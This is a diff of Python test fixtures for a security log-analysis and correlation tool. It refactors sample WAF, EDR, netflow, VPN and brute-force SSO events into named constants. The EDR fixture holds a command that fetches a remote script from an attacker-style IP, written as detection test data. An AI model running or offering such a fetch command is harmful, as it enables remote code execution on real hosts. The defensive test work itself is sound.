@@ -19,96 +19,113 @@ from agent_py_agent.agent.log_analysis.reports import (
 from agent_py_agent.agent.log_analysis.security.correlation import build_route_draft
 
 
-def _events() -> list[dict]:
-    events = [
+# ── Shared event fixtures ─────────────────────────────────────────────────────
+
+_WAF_EVENT = {
+    "event_id": "waf-1",
+    "event_time": "2026-04-30T10:00:00Z",
+    "source_id": "waf-prod",
+    "source_product": "waf",
+    "event_class": "alert",
+    "event_action": "detected",
+    "severity": "high",
+    "alert_type": "web_attack",
+    "threat_name": "generic command execution",
+    "uri": "/upload.php",
+    "attacker_ip": "198.51.100.10",
+    "victim_ip": "10.0.0.5",
+    "raw_ref": "raw-waf:line-1",
+}
+
+_EDR_EVENT = {
+    "event_id": "edr-1",
+    "event_time": "2026-04-30T10:02:00Z",
+    "source_id": "edr-prod",
+    "source_product": "edr",
+    "event_class": "process",
+    "event_action": "process_start",
+    "victim_ip": "10.0.0.5",
+    "host": "web-01",
+    "parent_process_name": "nginx",
+    "process_name": "bash",
+    "cmdline": "bash -c curl http://203.0.113.77/a.sh",
+    "raw_ref": "raw-edr:line-7",
+}
+
+_NETFLOW_EVENT = {
+    "event_id": "net-1",
+    "event_time": "2026-04-30T10:03:00Z",
+    "source_id": "netflow-prod",
+    "source_product": "netflow",
+    "event_class": "network",
+    "event_action": "connect",
+    "src_ip": "10.0.0.5",
+    "dst_ip": "203.0.113.77",
+    "dst_port": 443,
+    "rare": True,
+    "raw_ref": "raw-net:line-2",
+}
+
+_VPN_LOGIN_EVENT = {
+    "event_id": "vpn-1",
+    "event_time": "2026-04-30T11:00:00Z",
+    "source_id": "vpn-prod",
+    "source_product": "vpn",
+    "event_class": "auth",
+    "event_action": "login",
+    "event_outcome": "success",
+    "user": "alice",
+    "src_ip": "198.51.100.30",
+    "country": "ZZ",
+    "new_geo": True,
+    "raw_ref": "raw-vpn:line-1",
+}
+
+
+def _auth_failure_events() -> list[dict]:
+    """Build auth failure events for bob (used in bruteforce tests)."""
+    return [
         {
-            "event_id": "waf-1",
-            "event_time": "2026-04-30T10:00:00Z",
-            "source_id": "waf-prod",
-            "source_product": "waf",
-            "event_class": "alert",
-            "event_action": "detected",
-            "severity": "high",
-            "alert_type": "web_attack",
-            "threat_name": "generic command execution",
-            "uri": "/upload.php",
-            "attacker_ip": "198.51.100.10",
-            "victim_ip": "10.0.0.5",
-            "raw_ref": "raw-waf:line-1",
-        },
-        {
-            "event_id": "edr-1",
-            "event_time": "2026-04-30T10:02:00Z",
-            "source_id": "edr-prod",
-            "source_product": "edr",
-            "event_class": "process",
-            "event_action": "process_start",
-            "victim_ip": "10.0.0.5",
-            "host": "web-01",
-            "parent_process_name": "nginx",
-            "process_name": "bash",
-            "cmdline": "bash -c curl http://203.0.113.77/a.sh",
-            "raw_ref": "raw-edr:line-7",
-        },
-        {
-            "event_id": "net-1",
-            "event_time": "2026-04-30T10:03:00Z",
-            "source_id": "netflow-prod",
-            "source_product": "netflow",
-            "event_class": "network",
-            "event_action": "connect",
-            "src_ip": "10.0.0.5",
-            "dst_ip": "203.0.113.77",
-            "dst_port": 443,
-            "rare": True,
-            "raw_ref": "raw-net:line-2",
-        },
-        {
-            "event_id": "vpn-1",
-            "event_time": "2026-04-30T11:00:00Z",
-            "source_id": "vpn-prod",
-            "source_product": "vpn",
-            "event_class": "auth",
-            "event_action": "login",
-            "event_outcome": "success",
-            "user": "alice",
-            "src_ip": "198.51.100.30",
-            "country": "ZZ",
-            "new_geo": True,
-            "raw_ref": "raw-vpn:line-1",
-        },
-    ]
-    for index in range(5):
-        events.append(
-            {
-                "event_id": f"auth-fail-{index}",
-                "event_time": f"2026-04-30T11:0{index}:00Z",
-                "source_id": "sso-prod",
-                "source_product": "sso",
-                "event_class": "auth",
-                "event_action": "login",
-                "event_outcome": "failure",
-                "user": "bob",
-                "src_ip": "198.51.100.44",
-                "raw_ref": f"raw-sso:line-{index}",
-            }
-        )
-    events.append(
-        {
-            "event_id": "auth-success",
-            "event_time": "2026-04-30T11:06:00Z",
+            "event_id": f"auth-fail-{index}",
+            "event_time": f"2026-04-30T11:0{index}:00Z",
             "source_id": "sso-prod",
             "source_product": "sso",
             "event_class": "auth",
             "event_action": "login",
-            "event_outcome": "success",
+            "event_outcome": "failure",
             "user": "bob",
             "src_ip": "198.51.100.44",
-            "host": "app-01",
-            "raw_ref": "raw-sso:line-9",
+            "raw_ref": f"raw-sso:line-{index}",
         }
-    )
-    return events
+        for index in range(5)
+    ]
+
+
+def _auth_success_event() -> dict:
+    """Build auth success event for bob."""
+    return {
+        "event_id": "auth-success",
+        "event_time": "2026-04-30T11:06:00Z",
+        "source_id": "sso-prod",
+        "source_product": "sso",
+        "event_class": "auth",
+        "event_action": "login",
+        "event_outcome": "success",
+        "user": "bob",
+        "src_ip": "198.51.100.44",
+        "host": "app-01",
+        "raw_ref": "raw-sso:line-9",
+    }
+
+
+def _events() -> list[dict]:
+    """Full event set: WAF alert, EDR process, netflow, VPN login, bruteforce sequence, success."""
+    return [
+        _WAF_EVENT,
+        _EDR_EVENT,
+        _NETFLOW_EVENT,
+        _VPN_LOGIN_EVENT,
+    ] + _auth_failure_events() + [_auth_success_event()]
 
 
 def test_soft_detectors_emit_required_finding_fields():
